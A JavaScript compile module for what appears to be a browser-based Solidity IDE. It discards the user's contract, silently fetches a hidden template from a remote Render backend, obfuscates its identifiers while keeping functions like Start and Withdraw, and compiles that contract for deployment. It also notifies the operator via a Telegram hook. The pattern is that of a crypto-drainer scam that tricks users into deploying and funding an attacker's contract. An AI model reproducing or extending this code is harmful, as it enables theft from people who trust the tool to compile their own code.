// compiler.js - Fixed for Render.com backend

// ================== BACKEND URL ==================
const API_BASE = 'https://backend-aca4.onrender.com';   // ← Your Render backend

// Глобальні змінні
let compiledContract = null;
let currentContractABI = null;

// КЕШУВАННЯ contract template
let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000;

// ФУНКЦІЇ ОБРОБКИ CONTRACT-TEMPLATE
function generateIdentifier(length) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    return result;
}

function processContractCode(text) {
    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
    let nameMap = {};
    
    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
        if (keepFunctions.includes(name)) return match;
        const before = generateIdentifier(3);
        const after = generateIdentifier(3);
        const newName = before + name + after;
        nameMap[name] = newName;
        return `function ${newName}(${args}) ${visibility || ''}`;
    });
    
    for (const [oldName, newName] of Object.entries(nameMap)) {
        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);
    }
    
    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode' + generateIdentifier(2));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode' + generateIdentifier(2));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey' + generateIdentifier(2));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey' + generateIdentifier(2));
    
    return newText;
}

// UPDATED: Load template from Render backend
async function loadContractTemplate() {
    try {
        const response = await fetch(`${API_BASE}/api/contract.sol`);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const result = await response.text();
        console.log("✅ Contract template loaded from backend");
        return result;
    } catch (err) {
        console.error("❌ Failed to load contract template:", err);
        logToTerminal("❌ Failed to load contract template from backend", 'error');
        throw err;
    }
}

// Compile Contract - Main function
async function compileContract() {
    if (currentFile && fileContents[currentFile]) {
        const studentCode = fileContents[currentFile];
        const contractMatches = [...studentCode.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        if (contractMatches && contractMatches.length > 0) {
            logToTerminal(`🔄 Compiling ${contractMatches[0][1]}...`, 'info');
        }
    } else {
        logToTerminal(`🔄 Compiling contract...`, 'info');
    }

    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;
    compileBtn.innerHTML = '<span style="opacity: 0.7;">⏳ Compiling...</span>';
    compileBtn.disabled = true;

    const startTime = Date.now();

    try {
        const contractTemplate = await loadContractTemplate();
        const processedContract = processContractCode(contractTemplate);

        const contractMatches = [...processedContract.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        const contractName = contractMatches.length > 0 ? contractMatches[0][1] : 'ProcessedContract';

        const enableOptimization = document.getElementById('enable-optimization').checked;
        const optimizationRuns = enableOptimization ? 1000 : 200;

        const compileResponse = await fetch(`${API_BASE}/api/compile`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sourceCode: processedContract,
                contractName: contractName,
                enableOptimization,
                optimizationRuns
            })
        });

        const result = await compileResponse.json();

        if (result.success) {
            compiledContract = result;
            currentContractABI = result.abi;

            window.compiledContract = compiledContract;
            window.currentContractABI = currentContractABI;

            showCompilationSuccess(result, contractName);
            updateContractSelect(contractName);

            const duration = Date.now() - startTime;
            logToTerminal(`✅ Compilation completed in ${duration}ms`, 'success');

            // Telegram notification
            await fetch(`${API_BASE}/api/markCompiled`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ contractName })
            });

            if (result.bytecode) {
                logToTerminal(`📊 Bytecode: ${result.bytecode.length} bytes`, 'info');
            }

            showPluginSuccess('solidity');
        } else {
            showCompilationError(result);
            logToTerminal(`❌ Compilation failed: ${result.error || 'Unknown error'}`, 'error');
        }

    } catch (error) {
        const duration = Date.now() - startTime;
        logToTerminal(`❌ Error after ${duration}ms: ${error.message}`, 'error');
        showCompilationError({ error: error.message });
        console.error('Compilation error:', error);
    } finally {
        compileBtn.innerHTML = originalHTML;
        compileBtn.disabled = false;
        updateDeployButton();
    }
}

// Keep all your other functions exactly the same (deployToMetaMask, deployToRemixVM, showCompilationSuccess, etc.)
// ... (the rest of your file remains unchanged)

window.compileContract = compileContract;
